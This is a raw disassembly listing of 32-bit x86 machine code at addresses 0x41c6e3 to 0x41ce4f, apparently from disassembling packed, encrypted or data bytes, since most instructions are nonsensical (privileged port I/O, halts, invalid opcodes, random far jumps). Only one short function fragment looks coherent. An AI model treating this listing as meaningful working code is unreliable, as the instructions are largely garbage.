  41c6e3:	sbb    eax,0x6ee02b6d
  41c6e8:	js     0x41c728
  41c6ea:	ficom  DWORD PTR [ebx+0x3e2ef75]
  41c6f0:	sub    bh,BYTE PTR ss:[ecx-0x6]
  41c6f4:	clc    
  41c6f5:	push   esp
  41c6f6:	cmp    DWORD PTR [esi-0x1c],ebx
  41c6f9:	bound  esp,QWORD PTR [ecx+0x8]
  41c6fc:	jne    0x41c6fe
  41c6fe:	icebp  
  41c6ff:	push   edx
  41c700:	cmp    edx,DWORD PTR [edx]
  41c702:	sti    
  41c703:	mov    edx,0xe0695568
  41c708:	les    ecx,FWORD PTR [edi]
  41c70a:	or     ah,BYTE PTR [ecx]
  41c70c:	sub    DWORD PTR [edi],ecx
  41c70e:	cmp    eax,0x5c80ebee
  41c713:	mov    esp,DWORD PTR [edi-0x41]
  41c716:	sub    edx,ebp
  41c718:	js     0x41c6d0
  41c71a:	xor    bh,BYTE PTR [ebx-0x44f3851a]
  41c720:	in     al,dx
  41c721:	test   al,0x19
  41c723:	mov    eax,ds:0x46a33545
  41c728:	ins    BYTE PTR es:[edi],dx
  41c729:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c72a:	enter  0x26b6,0x9c
  41c72e:	sub    bh,ch
  41c730:	mov    edx,DWORD PTR [eax-0x472549c1]
  41c736:	aas    
  41c737:	pop    esi
  41c738:	mov    cl,0x85
  41c73a:	or     ebp,DWORD PTR [eax+0x36]
  41c73d:	retf   0xe376
  41c740:	lea    esp,[ebp-0x1a]
  41c743:	hlt    
  41c744:	daa    
  41c745:	and    dl,BYTE PTR [ebp-0x5e5e6e98]
  41c74b:	sbb    dh,BYTE PTR [esi-0x61]
  41c74e:	fsubrp st(6),st
  41c750:	dec    esp
  41c751:	and    eax,0x3b5cac8e
  41c756:	push   0x6bba3170
  41c75b:	sbb    BYTE PTR [edx+ecx*1-0x40],bl
  41c75f:	fcom   QWORD PTR [edi]
  41c761:	and    edx,edx
  41c763:	and    BYTE PTR [esi+0x1b],0x3
  41c767:	and    BYTE PTR [esi],al
  41c769:	mul    DWORD PTR [edx+0x21b6abff]
  41c76f:	std    
  41c770:	xchg   ecx,eax
  41c771:	aaa    
  41c772:	cdq    
  41c773:	cs pop ebp
  41c775:	ds jmp 0x41c7c5
  41c778:	addr16 out 0x6c,eax
  41c77b:	mov    ds:0xfe9fe998,eax
  41c780:	xchg   edi,eax
  41c781:	hlt    
  41c782:	ja     0x41c796
  41c784:	mov    esp,0x98d2daec
  41c789:	and    eax,0xc94ee74b
  41c78e:	or     eax,0x999c7825
  41c793:	push   0x17d9c4fb
  41c798:	xor    DWORD PTR [ecx],0xffffffcb
  41c79b:	xor    DWORD PTR [edx-0x60],esp
  41c79e:	xchg   ebx,eax
  41c79f:	mov    ebx,DWORD PTR [esi+0x35]
  41c7a2:	jecxz  0x41c766
  41c7a4:	fucomi st,st(7)
  41c7a6:	nop
  41c7a7:	jecxz  0x41c808
  41c7a9:	popa   
  41c7aa:	cmp    esp,DWORD PTR [eax+esi*2-0x7f463796]
  41c7b1:	repz adc al,dh
  41c7b4:	es aad 0xf6
  41c7b7:	dec    ecx
  41c7b8:	xchg   esi,eax
  41c7b9:	pop    edi
  41c7ba:	das    
  41c7bb:	inc    ecx
  41c7bc:	stc    
  41c7bd:	push   ebp
  41c7be:	aaa    
  41c7bf:	pop    DWORD PTR [eax-0x7afd625b]
  41c7c5:	cdq    
  41c7c6:	push   esi
  41c7c7:	jbe    0x41c78f
  41c7c9:	mul    DWORD PTR [eax-0x4e6d6148]
  41c7cf:	push   eax
  41c7d0:	push   eax
  41c7d1:	and    eax,0xaf3b7932
  41c7d6:	cmp    cl,bh
  41c7d8:	sub    ecx,esp
  41c7da:	lods   eax,DWORD PTR ds:[esi]
  41c7db:	in     al,0x7c
  41c7dd:	dec    ebp
  41c7de:	mov    ?,WORD PTR [eax+0x51]
  41c7e1:	arpl   WORD PTR [ecx],ax
  41c7e3:	neg    BYTE PTR [edx]
  41c7e5:	jmp    edx
  41c7e7:	push   edi
  41c7e8:	imul   esi,DWORD PTR [ecx+0x462254d8],0x24
  41c7ef:	inc    ebx
  41c7f0:	sbb    BYTE PTR [eax-0x73],bh
  41c7f3:	arpl   WORD PTR [ecx],di
  41c7f5:	sbb    DWORD PTR ds:0xc7d6e0cd,eax
  41c7fb:	(bad)  
  41c7fe:	or     eax,DWORD PTR [eax+0x23b21ff1]
  41c804:	gs ins DWORD PTR es:[edi],dx
  41c806:	sbb    bl,BYTE PTR [ecx]
  41c808:	xor    al,0x78
  41c80a:	mov    ds:0x40cb3bc9,eax
  41c80f:	xor    cl,0xc0
  41c812:	sbb    edi,eax
  41c814:	inc    esi
  41c815:	inc    ebp
  41c816:	and    eax,0xe7df218
  41c81b:	push   cs
  41c81c:	add    al,0x49
  41c81e:	dec    ecx
  41c81f:	mov    al,dh
  41c821:	shr    BYTE PTR [esi+0x3f],1
  41c824:	jbe    0x41c84d
  41c826:	loop   0x41c7c8
  41c828:	adc    BYTE PTR [esi-0x2dba13f9],ah
  41c82e:	and    dh,BYTE PTR [ebp+0x18cf1c0e]
  41c834:	js     0x41c88b
  41c836:	mov    BYTE PTR [ebx-0x5b400476],0x1c
  41c83d:	and    eax,0x5eae8f04
  41c842:	push   edi
  41c843:	mov    BYTE PTR [esi+0x4eca122d],dh
  41c849:	mov    al,0x76
  41c84b:	out    0xff,al
  41c84d:	pop    esi
  41c84e:	rol    DWORD PTR [eax+ebx*4],0xdc
  41c852:	inc    esp
  41c853:	mov    cl,0xbe
  41c855:	mov    edx,0x66599615
  41c85a:	inc    esp
  41c85b:	lahf   
  41c85c:	outs   dx,DWORD PTR ds:[esi]
  41c85d:	jo     0x41c8b3
  41c85f:	mov    ds:0xddb9dd09,al
  41c864:	retf   
  41c865:	addr16 pop edi
  41c867:	sar    DWORD PTR [ebx+eax*1+0x35],0x6f
  41c86c:	and    eax,DWORD PTR [eax]
  41c86e:	out    dx,eax
  41c86f:	push   ebp
  41c870:	out    dx,eax
  41c871:	scas   eax,DWORD PTR es:[edi]
  41c872:	or     al,0x84
  41c874:	inc    esi
  41c875:	pop    ss
  41c876:	gs fwait
  41c878:	mov    DWORD PTR [edi],edx
  41c87a:	jo     0x41c85e
  41c87c:	ds nop
  41c87e:	cs inc esp
  41c880:	jbe    0x41c8e0
  41c882:	inc    edx
  41c883:	and    eax,0x8844957b
  41c888:	mov    dl,0x5e
  41c88a:	dec    BYTE PTR [esi+0x78c78fa9]
  41c890:	test   DWORD PTR [ebx+edi*2+0x36961fa3],edx
  41c897:	adc    eax,0xf936552d
  41c89c:	inc    ebp
  41c89d:	int3   
  41c89e:	add    eax,ecx
  41c8a0:	mov    ecx,DWORD PTR [ebp+0xc]
  41c8a3:	imul   eax,ecx
  41c8a6:	add    eax,DWORD PTR [ebp+0x8]
  41c8a9:	mov    DWORD PTR [ebp+0xc],eax
  41c8ac:	mov    eax,DWORD PTR [ebp+0xc]
  41c8af:	pop    esi
  41c8b0:	leave  
  41c8b1:	ret    0x8
  41c8b4:	pop    ss
  41c8b5:	or     al,0x84
  41c8b7:	repz lahf 
  41c8b9:	sti    
  41c8ba:	ja     0x41c8a8
  41c8bc:	stos   BYTE PTR es:[edi],al
  41c8bd:	mov    edx,0xacbf88e2
  41c8c2:	push   0xffffffbe
  41c8c4:	scas   eax,DWORD PTR es:[edi]
  41c8c5:	test   DWORD PTR [ecx],eax
  41c8c7:	add    BYTE PTR [ebp+0xa000000],ch
  41c8cd:	repnz push ss
  41c8cf:	adc    bh,BYTE PTR [edx]
  41c8d1:	sar    DWORD PTR [edi+0x48],0xb
  41c8d5:	jne    0x41c913
  41c8d7:	mov    al,ds:0xd459b23f
  41c8dc:	lock mov al,0x1a
  41c8df:	js     0x41c862
  41c8e1:	xor    al,al
  41c8e3:	cmp    esi,0xb4c26a32
  41c8e9:	xchg   esi,eax
  41c8ea:	(bad)  [ebp-0x1870d6d0]
  41c8f0:	jmp    0xdb42:0xff4cdc42
  41c8f7:	data16 and BYTE PTR [eax-0x4b],dl
  41c8fb:	(bad)  
  41c8fc:	lea    edi,[edx]
  41c8fe:	xchg   BYTE PTR [esi+esi*2-0x22],ah
  41c902:	push   ss
  41c903:	jg     0x41c8e9
  41c905:	and    al,0x76
  41c907:	sbb    eax,DWORD PTR [ebx-0x14]
  41c90a:	mov    eax,0x3552111
  41c90f:	xchg   esi,eax
  41c910:	jge    0x41c958
  41c912:	test   DWORD PTR [edx-0x28ff5e22],esp
  41c918:	test   al,0xe3
  41c91a:	dec    eax
  41c91b:	push   es
  41c91c:	and    eax,0xb11cc34e
  41c921:	or     eax,0xd4cbf859
  41c926:	xor    ebx,esi
  41c928:	out    0xb7,eax
  41c92a:	jecxz  0x41c8e5
  41c92c:	mov    edx,0x9922f732
  41c931:	sti    
  41c932:	cld    
  41c933:	pop    edi
  41c934:	sbb    BYTE PTR [edx],bh
  41c936:	les    esp,FWORD PTR [ebx]
  41c938:	mov    edi,0x9765ef54
  41c93d:	stc    
  41c93e:	mov    al,0x31
  41c940:	inc    ecx
  41c941:	retf   0xe9f5
  41c944:	mov    es,WORD PTR [edi]
  41c946:	(bad)  
  41c947:	iret   
  41c948:	stos   DWORD PTR es:[edi],eax
  41c949:	mov    bl,0x60
  41c94b:	imul   edx,DWORD PTR [ecx+0x36aedfa],0x1d
  41c952:	xchg   edi,eax
  41c953:	aam    0x8d
  41c955:	arpl   WORD PTR [ebx-0x64],ax
  41c958:	or     ebp,esp
  41c95a:	stc    
  41c95b:	inc    eax
  41c95c:	ins    BYTE PTR es:[edi],dx
  41c95d:	gs dec esi
  41c95f:	mov    dl,0x6
  41c961:	push   ds
  41c962:	push   ebx
  41c963:	pop    edx
  41c964:	ret    
  41c965:	icebp  
  41c966:	aad    0x4f
  41c968:	int    0x24
  41c96a:	fwait
  41c96b:	lods   eax,DWORD PTR ds:[esi]
  41c96c:	pop    eax
  41c96d:	xchg   BYTE PTR [esi-0x34],cl
  41c970:	shl    BYTE PTR [eax+0x318dc899],0x97
  41c977:	cmp    BYTE PTR [ecx],0x0
	...
  41c982:	add    BYTE PTR [eax],al
  41c984:	shr    DWORD PTR [esp+edx*1],1
  41c987:	adc    edi,ebp
  41c989:	cmp    edx,edi
  41c98b:	out    dx,al
  41c98c:	pop    edi
  41c98d:	xchg   bx,ax
  41c98f:	push   0x58b8515c
  41c994:	pop    esp
  41c995:	xchg   BYTE PTR [ecx],al
  41c997:	add    BYTE PTR [ebp-0x26000000],ch
  41c99d:	mov    cl,0xf1
  41c99f:	and    ch,BYTE PTR [edx+esi*1-0x6ffa0908]
  41c9a6:	pushw  cs
  41c9a8:	dec    eax
  41c9a9:	popf   
  41c9aa:	or     BYTE PTR [esp+edi*1],bl
  41c9ad:	sub    DWORD PTR [edi],eax
  41c9af:	adc    eax,0x5544c407
  41c9b4:	push   esi
  41c9b5:	xor    BYTE PTR [esi-0x73],dl
  41c9b8:	xchg   edx,eax
  41c9b9:	mov    eax,0x5d136dce
  41c9be:	mov    ebx,eax
  41c9c0:	in     al,dx
  41c9c1:	adc    ch,BYTE PTR [edx+0x1dc46941]
  41c9c7:	cld    
  41c9c8:	and    al,0xd4
  41c9ca:	adc    eax,0x76e53d55
  41c9cf:	hlt    
  41c9d0:	jmp    0x42c301ac
  41c9d5:	mov    bh,0xce
  41c9d7:	inc    eax
  41c9d8:	push   edx
  41c9d9:	push   ebp
  41c9da:	rcr    BYTE PTR [edx+0xb],cl
  41c9dd:	es push edx
  41c9df:	loop   0x41ca42
  41c9e1:	xchg   esp,eax
  41c9e2:	mov    ah,0x72
  41c9e4:	loopne 0x41ca3a
  41c9e6:	sti    
  41c9e7:	stos   BYTE PTR es:[edi],al
  41c9e8:	jno    0x41c9ed
  41c9ea:	jnp    0x41c9e6
  41c9ec:	dec    ecx
  41c9ed:	jno    0x41ca44
  41c9ef:	xchg   edi,eax
  41c9f0:	arpl   dx,bx
  41c9f2:	(bad)  [edi-0x1c]
  41c9f5:	ret    
  41c9f6:	(bad)  
  41c9f8:	xchg   edi,eax
  41c9f9:	adc    eax,0x2ffcdfb4
  41c9fe:	adc    ebp,esp
  41ca00:	loop   0x41c9da
  41ca02:	scas   al,BYTE PTR es:[edi]
  41ca03:	inc    ebp
  41ca04:	mov    ecx,0x871a5dae
  41ca09:	xor    bh,BYTE PTR [ebp+0x2f8d5056]
  41ca0f:	push   cs
  41ca10:	test   bh,dl
  41ca12:	dec    esi
  41ca13:	mov    dl,0xf9
  41ca15:	jns    0x41c9b1
  41ca17:	push   cs
  41ca18:	hlt    
  41ca19:	outs   dx,DWORD PTR ds:[esi]
  41ca1a:	stos   DWORD PTR es:[edi],eax
  41ca1b:	jb     0x41ca43
  41ca1d:	cmp    esi,esp
  41ca1f:	enter  0xfe3c,0xe8
  41ca23:	bound  esi,QWORD PTR [ecx-0x3cad0f3b]
  41ca29:	adc    ebx,DWORD PTR [ecx+0x6]
  41ca2c:	cli    
  41ca2d:	fisub  DWORD PTR [edi-0x12]
  41ca30:	or     ch,ah
  41ca32:	mov    bl,0x65
  41ca34:	aam    0xf6
  41ca36:	mov    dh,0x8b
  41ca38:	add    eax,0x8e3ed572
  41ca3d:	pop    esp
  41ca3e:	dec    esp
  41ca3f:	in     eax,dx
  41ca40:	fwait
  41ca41:	adc    DWORD PTR [ecx-0x29ed7a7a],edx
  41ca47:	mov    ?,WORD PTR [eax+0x0]
  41ca4d:	add    BYTE PTR [eax],al
  41ca4f:	add    BYTE PTR [eax],al
  41ca51:	add    BYTE PTR [eax],al
  41ca53:	add    BYTE PTR [edi],bl
  41ca55:	sub    esp,DWORD PTR [eax-0x60404bc1]
  41ca5b:	sub    eax,esi
  41ca5d:	add    BYTE PTR [edi+eax*2-0xc27bad6],0x9
  41ca65:	xchg   DWORD PTR [ecx],eax
  41ca67:	add    BYTE PTR [ebp-0x72000000],ch
  41ca6d:	mov    eax,0x385ff2ff
  41ca72:	(bad)  
  41ca73:	call   0x6ad0:0x6d93608c
  41ca7a:	call   0x84bf:0x1fb20c1e
  41ca81:	lods   eax,DWORD PTR ds:[esi]
  41ca82:	xlat   BYTE PTR ds:[ebx]
  41ca83:	(bad)  
  41ca84:	das    
  41ca85:	cli    
  41ca86:	inc    esi
  41ca87:	popf   
  41ca88:	shr    BYTE PTR [edx],1
  41ca8a:	call   FWORD PTR [esi]
  41ca8c:	add    al,0xde
  41ca8e:	imul   edx,ebx,0xee4a7305
  41ca94:	in     eax,0xde
  41ca96:	xor    DWORD PTR [edx+0x1c3e5389],ecx
  41ca9c:	pop    es
  41ca9d:	jae    0x41cb14
  41ca9f:	xor    eax,0x9a25195c
  41caa4:	stos   DWORD PTR es:[edi],eax
  41caa5:	gs mov ecx,0xafe1064e
  41caab:	enter  0xe598,0xdf
  41caaf:	cwde   
  41cab0:	pop    esi
  41cab1:	xchg   esp,eax
  41cab2:	push   edi
  41cab3:	xchg   ch,ah
  41cab5:	aam    0x71
  41cab7:	aaa    
  41cab8:	sub    BYTE PTR [eax-0x45],ah
  41cabb:	cmp    DWORD PTR [eax],ebx
  41cabd:	adc    DWORD PTR [edx+eiz*2],ecx
  41cac0:	test   eax,0x51f1ed71
  41cac5:	or     edi,ebp
  41cac7:	adc    DWORD PTR [ebp+0x9ad1898],ebx
  41cacd:	push   ss
  41cace:	pop    ss
  41cacf:	bound  ebp,QWORD PTR [esi+0x23c3d3d]
  41cad5:	lods   al,BYTE PTR ds:[esi]
  41cad6:	xlat   BYTE PTR ds:[ebx]
  41cad7:	in     eax,dx
  41cad8:	inc    edi
  41cad9:	cmp    BYTE PTR ds:0xa1f8ab40,al
  41cadf:	pop    edx
  41cae0:	pushf  
  41cae1:	and    bl,BYTE PTR [edx+0x53]
  41cae4:	dec    ecx
  41cae5:	xchg   ecx,eax
  41cae6:	cmp    DWORD PTR [esi+edi*8+0x6d],eax
  41caea:	or     eax,0x2f5c93ad
  41caef:	or     BYTE PTR [edx+0x6f],al
  41caf2:	(bad)  
  41caf3:	adc    al,0xe9
  41caf5:	call   DWORD PTR [eax]
  41caf7:	and    DWORD PTR [esi],edi
  41caf9:	add    al,0x1
  41cafb:	mov    esp,0x79c3c47e
  41cb00:	jbe    0x41cabd
  41cb02:	outs   dx,BYTE PTR ds:[esi]
  41cb03:	mov    DWORD PTR [ebx],0xe6a0c28b
  41cb09:	xchg   edx,eax
  41cb0a:	cli    
  41cb0b:	mov    WORD PTR [edx-0x1a],ds
  41cb0e:	inc    esi
  41cb0f:	push   0xffffff95
  41cb11:	mov    al,ds:0xa620e2ad
  41cb16:	imul   eax,DWORD PTR [edx+edx*8+0x0],0x0
  41cb1e:	add    BYTE PTR [eax],al
  41cb20:	add    BYTE PTR [eax],al
  41cb22:	add    BYTE PTR [eax],al
  41cb24:	das    
  41cb25:	and    al,0xf0
  41cb27:	aam    0xfb
  41cb29:	aam    0x2f
  41cb2b:	jmp    FWORD PTR [esi+0x33]
  41cb2e:	je     0x41cae6
  41cb30:	or     esp,esp
  41cb32:	repz dec ebx
  41cb34:	mov    dh,0x87
  41cb36:	add    DWORD PTR [eax],eax
  41cb38:	lods   eax,DWORD PTR ds:[esi]
  41cb39:	add    BYTE PTR [eax],al
  41cb3b:	add    BYTE PTR [ecx+0x22],bh
  41cb3e:	neg    BYTE PTR [ecx]
  41cb40:	aad    0xdc
  41cb42:	inc    ebx
  41cb43:	sbb    dh,ch
  41cb45:	hlt    
  41cb46:	outs   dx,DWORD PTR ds:[esi]
  41cb47:	les    eax,FWORD PTR [eax+0x6fbf1c82]
  41cb4d:	push   esp
  41cb4e:	int3   
  41cb4f:	cs enter 0x27a0,0x14
  41cb54:	mov    ebx,DWORD PTR [ebx+0x34]
  41cb57:	test   BYTE PTR [edx],0xce
  41cb5a:	out    dx,al
  41cb5b:	xor    BYTE PTR [ebp-0x4],0x6c
  41cb5f:	js     0x41cb11
  41cb61:	sbb    ebx,ebp
  41cb63:	jnp    0x41cbb5
  41cb65:	in     al,dx
  41cb66:	leave  
  41cb67:	lock xor eax,0x9d3c12ed
  41cb6d:	pop    esi
  41cb6e:	cs jle 0x41cbc5
  41cb71:	pop    esi
  41cb72:	mov    edi,0xbdc5af07
  41cb77:	in     al,dx
  41cb78:	adc    ch,dh
  41cb7a:	mov    ebx,0x9ee60c4c
  41cb7f:	aas    
  41cb80:	mov    dl,0xd
  41cb82:	(bad)  
  41cb83:	outs   dx,DWORD PTR ds:[esi]
  41cb84:	adc    al,0x2a
  41cb86:	jno    0x41cb61
  41cb88:	cs pop edi
  41cb8a:	mov    cl,0x37
  41cb8c:	pusha  
  41cb8d:	pop    ebp
  41cb8e:	mov    ds:0xf907317d,al
  41cb93:	push   ebx
  41cb94:	mov    bh,0x2f
  41cb96:	adc    DWORD PTR ds:0xaa65c362,ebp
  41cb9c:	ficom  DWORD PTR [ecx]
  41cb9e:	mov    edx,0x3b3d0df5
  41cba3:	mov    bl,0x9a
  41cba5:	pop    ds
  41cba6:	fstp   QWORD PTR [esi-0x6f]
  41cba9:	or     eax,0x57f8dcc1
  41cbae:	push   0x3c
  41cbb0:	xlat   BYTE PTR ds:[ebx]
  41cbb1:	mov    WORD PTR [ecx+eiz*8-0x63b60148],es
  41cbb8:	push   esi
  41cbb9:	inc    ebp
  41cbba:	shr    BYTE PTR [ecx-0x1724a952],1
  41cbc0:	mov    bh,0x5c
  41cbc2:	fwait
  41cbc3:	adc    eax,0x68da89b0
  41cbc8:	rcr    BYTE PTR [edi-0x63],1
  41cbcb:	dec    ebx
  41cbcc:	pop    esi
  41cbcd:	ds jnp 0x41cb9a
  41cbd0:	push   0xe5666015
  41cbd5:	sub    al,0xb3
  41cbd8:	push   0x84e365dd
  41cbdd:	test   eax,0x79731ace
  41cbe2:	xchg   edx,eax
  41cbe3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cbe4:	mov    bh,0xf3
  41cbe6:	clc    
  41cbe7:	inc    edi
  41cbe8:	rol    DWORD PTR [eax],1
	...
  41cbf2:	add    BYTE PTR [eax],al
  41cbf4:	retf   0x76a0
  41cbf7:	dec    ebp
  41cbf8:	jle    0x41cbd9
  41cbfa:	sti    
  41cbfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbfc:	mov    bh,0x83
  41cbfe:	dec    edi
  41cbff:	mov    ds:0xd48615fa,al
  41cc04:	arpl   WORD PTR [eax+0xad0001],cx
  41cc0a:	add    BYTE PTR [eax],al
  41cc0c:	xor    ebp,0xb965b0a9
  41cc12:	pop    eax
  41cc13:	pop    es
  41cc14:	in     al,dx
  41cc15:	adc    BYTE PTR [ebp+0x7a],bl
  41cc18:	fsubr  DWORD PTR [ebx+eiz*2+0x7fafd972]
  41cc1f:	out    dx,eax
  41cc20:	jns    0x41cbbd
  41cc22:	loop   0x41cbf6
  41cc24:	int3   
  41cc25:	add    al,0xaa
  41cc27:	sti    
  41cc28:	sbb    DWORD PTR [eax-0x5e13f800],ebx
  41cc2e:	or     edi,ebx
  41cc30:	stos   DWORD PTR es:[edi],eax
  41cc31:	inc    eax
  41cc32:	adc    DWORD PTR [edi+edx*4],ecx
  41cc35:	int3   
  41cc36:	inc    ecx
  41cc37:	dec    ebp
  41cc38:	cmp    DWORD PTR [edx],edx
  41cc3a:	js     0x41cbfe
  41cc3c:	inc    esp
  41cc3d:	mov    ah,0xed
  41cc3f:	cmp    esi,DWORD PTR [ebx-0x76e4d01b]
  41cc45:	pushf  
  41cc46:	mov    dl,0xed
  41cc48:	sub    DWORD PTR [esi-0x4861a3ac],eax
  41cc4e:	adc    DWORD PTR [ecx],edx
  41cc50:	cli    
  41cc51:	jns    0x41cc0b
  41cc53:	jmp    0xf0d4f637
  41cc58:	aaa    
  41cc59:	test   eax,0x5fbad548
  41cc5e:	dec    edx
  41cc5f:	mov    ds:0x4a46455f,al
  41cc64:	mov    bh,0x4f
  41cc66:	pop    ss
  41cc67:	hlt    
  41cc68:	sbb    ah,ch
  41cc6a:	sbb    DWORD PTR [edi],ebp
  41cc6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc6d:	(bad)  
  41cc6e:	push   edi
  41cc6f:	int    0xcd
  41cc71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc72:	fstp   QWORD PTR [ecx-0x21]
  41cc75:	pop    ebp
  41cc76:	mov    cl,0x8b
  41cc78:	aas    
  41cc79:	loope  0x41cc3c
  41cc7b:	push   edx
  41cc7c:	stos   BYTE PTR es:[edi],al
  41cc7d:	pop    ss
  41cc7e:	lods   eax,DWORD PTR ds:[esi]
  41cc7f:	inc    eax
  41cc80:	dec    ebx
  41cc81:	popf   
  41cc82:	jle    0x41ccfb
  41cc84:	add    DWORD PTR [ebp+eax*2+0x6fcbdc3d],ecx
  41cc8b:	cmp    eax,0xacd98dc1
  41cc90:	rcl    ch,0x7b
  41cc93:	dec    BYTE PTR [edi]
  41cc95:	int    0x3f
  41cc97:	sub    eax,0x5948ef6a
  41cc9c:	sti    
  41cc9d:	mov    ah,0x2f
  41cc9f:	out    0x5b,al
  41cca1:	adc    DWORD PTR [eax+0x2e],0x1
  41cca5:	sub    al,0xe7
  41cca7:	inc    edi
  41cca8:	ds scas eax,DWORD PTR es:[edi]
  41ccaa:	or     al,0xd6
  41ccac:	xchg   edi,eax
  41ccad:	mov    ch,0xa8
  41ccaf:	loope  0x41cca6
  41ccb1:	add    ecx,ebp
  41ccb3:	sub    bh,BYTE PTR [ebp-0x6000f45a]
	...
  41ccc1:	add    BYTE PTR [eax],al
  41ccc3:	add    dh,al
  41ccc5:	out    dx,al
  41ccc6:	lods   al,BYTE PTR ds:[esi]
  41ccc7:	cmp    ch,BYTE PTR [edx+edi*2+0x5223fed6]
  41ccce:	stc    
  41cccf:	stc    
  41ccd0:	mov    edx,0x1043aca5
  41ccd5:	mov    DWORD PTR [ecx],eax
  41ccd7:	add    BYTE PTR [ebp-0x49000000],ch
  41ccdd:	adc    DWORD PTR ds:0xf7e397ca,ecx
  41cce3:	mov    cl,0xe1
  41cce5:	clc    
  41cce6:	xor    DWORD PTR [ebp+ebx*8-0x4f],0x3e
  41cceb:	mov    esi,0xce806c88
  41ccf0:	cmc    
  41ccf1:	or     dl,BYTE PTR ds:0x2e0df678
  41ccf7:	mov    ebp,0xd8feb004
  41ccfc:	mov    ah,0x7d
  41ccfe:	stc    
  41ccff:	inc    ebx
  41cd00:	xlat   BYTE PTR ds:[ebx]
  41cd01:	and    bl,dh
  41cd03:	pusha  
  41cd04:	ins    BYTE PTR es:[edi],dx
  41cd05:	xchg   ebp,eax
  41cd06:	test   eax,0x571a5eda
  41cd0b:	loopne 0x41cd1f
  41cd0d:	xlat   BYTE PTR ds:[ebx]
  41cd0e:	lock jne 0x41ccdd
  41cd11:	nop
  41cd12:	addr16 inc eax
  41cd14:	and    dl,BYTE PTR [eax]
  41cd16:	xor    al,0x86
  41cd18:	mov    edx,DWORD PTR [edi-0x1827e7c1]
  41cd1e:	adc    DWORD PTR [edi],0xffffffec
  41cd21:	int3   
  41cd22:	dec    esi
  41cd23:	dec    ebx
  41cd24:	or     BYTE PTR [eax+eax*2-0x2],ch
  41cd28:	into   
  41cd29:	cld    
  41cd2a:	jns    0x41cd24
  41cd2c:	cmp    DWORD PTR ds:0xe415a06e,0xb5f451b3
  41cd36:	sbb    BYTE PTR [ebp+edi*2+0x34],bl
  41cd3a:	cmc    
  41cd3b:	out    dx,al
  41cd3c:	imul   esp,ebx,0xc2724914
  41cd42:	xchg   edx,eax
  41cd43:	mov    edx,0x3e4fa16a
  41cd48:	outs   dx,BYTE PTR ds:[esi]
  41cd49:	dec    eax
  41cd4a:	fdiv   QWORD PTR [edx+0x45]
  41cd4d:	pop    ebx
  41cd4e:	cmp    BYTE PTR [ebx],bh
  41cd50:	cwde   
  41cd51:	xchg   DWORD PTR [edi-0x3870bd0b],eax
  41cd57:	mov    al,0xa3
  41cd59:	jecxz  0x41cd59
  41cd5b:	jmp    0x41cd83
  41cd5d:	and    eax,0xc6d0d1b1
  41cd62:	inc    eax
  41cd63:	jns    0x41cd93
  41cd65:	mov    esp,0xddf86dba
  41cd6a:	shl    DWORD PTR [eax+0x52164e1b],cl
  41cd70:	jne    0x41ccf9
  41cd72:	in     al,dx
  41cd73:	call   0x5a4d:0x8dcab7e9
  41cd7a:	jmp    0x41cdf1
  41cd7c:	scas   eax,DWORD PTR es:[edi]
  41cd7d:	imul   esi,DWORD PTR [edx],0x6207fb43
  41cd83:	loop   0x41cdfc
  41cd85:	lahf   
  41cd86:	inc    eax
  41cd87:	ret    
  41cd88:	iret   
	...
  41cd91:	add    BYTE PTR [eax],al
  41cd93:	add    BYTE PTR [edx+0x34],dl
  41cd96:	inc    eax
  41cd97:	gs data16 jne 0x41ce12
  41cd9b:	aaa    
  41cd9c:	push   0xfd6a4e09
  41cda1:	stc    
  41cda2:	in     eax,0xb9
  41cda4:	mov    ebp,0xad000189
  41cda9:	add    BYTE PTR [eax],al
  41cdab:	add    BYTE PTR [eax+0x15],bh
  41cdae:	push   esp
  41cdaf:	inc    esi
  41cdb0:	call   0x980f2cf
  41cdb5:	daa    
  41cdb6:	jmp    0x8d08c73b
  41cdbb:	or     bl,dl
  41cdbd:	outs   dx,BYTE PTR ds:[esi]
  41cdbe:	cwde   
  41cdbf:	cmp    esp,edi
  41cdc1:	ret    0x297f
  41cdc4:	push   es
  41cdc5:	dec    esi
  41cdc6:	clc    
  41cdc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cdc8:	and    dl,ah
  41cdca:	test   al,0x2d
  41cdcc:	fisttp DWORD PTR [eax]
  41cdce:	fisttp DWORD PTR [esp+eiz*2]
  41cdd1:	sub    dl,cl
  41cdd3:	sub    DWORD PTR [ecx+0x3c],ebp
  41cdd6:	test   al,0x5
  41cdd8:	dec    esp
  41cdd9:	adc    DWORD PTR [ebx+0x48],ebp
  41cddc:	jns    0x41cdc9
  41cdde:	les    esi,FWORD PTR [edi+0x3e]
  41cde1:	test   eax,0x78628fab
  41cde6:	jns    0x41ce50
  41cde8:	stos   BYTE PTR es:[edi],al
  41cde9:	mov    dl,BYTE PTR [edx-0x5]
  41cdec:	fisubr WORD PTR [ecx]
  41cdee:	ror    DWORD PTR [eax-0x4d],0x15
  41cdf2:	sbb    eax,0xbfeebaf1
  41cdf7:	repnz lahf 
  41cdf9:	cmp    eax,DWORD PTR [ecx]
  41cdfb:	sub    DWORD PTR [edx+0x21b0afef],0x9b0fb28
  41ce05:	scas   al,BYTE PTR es:[edi]
  41ce06:	iret   
  41ce07:	mov    edx,0xd8b6c19c
  41ce0c:	mov    dl,0x24
  41ce0e:	mov    al,ch
  41ce10:	dec    ebx
  41ce11:	adc    al,0xab
  41ce13:	or     bh,dh
  41ce15:	inc    esp
  41ce16:	mov    esi,0xd763456e
  41ce1b:	repnz sahf 
  41ce1d:	cmp    BYTE PTR [eax],0x0
  41ce20:	mov    cl,0x7f
  41ce22:	push   ecx
  41ce23:	scas   eax,DWORD PTR es:[edi]
  41ce24:	out    0x66,al
  41ce26:	push   0xffffff98
  41ce28:	mov    al,ds:0xb1a38a23
  41ce2d:	mov    edi,0x2536ba
  41ce32:	dec    ebx
  41ce33:	xor    al,0x43
  41ce35:	add    al,0x4f
  41ce37:	nop    DWORD PTR [edi-0x4a]
  41ce3b:	sti    
  41ce3c:	retf   0x3b6
  41ce3f:	or     DWORD PTR [ecx-0x28],esi
  41ce42:	and    bh,dh
  41ce44:	ss test eax,0xe656abc1
  41ce4b:	sub    al,0x17
  41ce4d:	nop
  41ce4e:	xchg   edx,eax
  41ce4f:	pop    ds
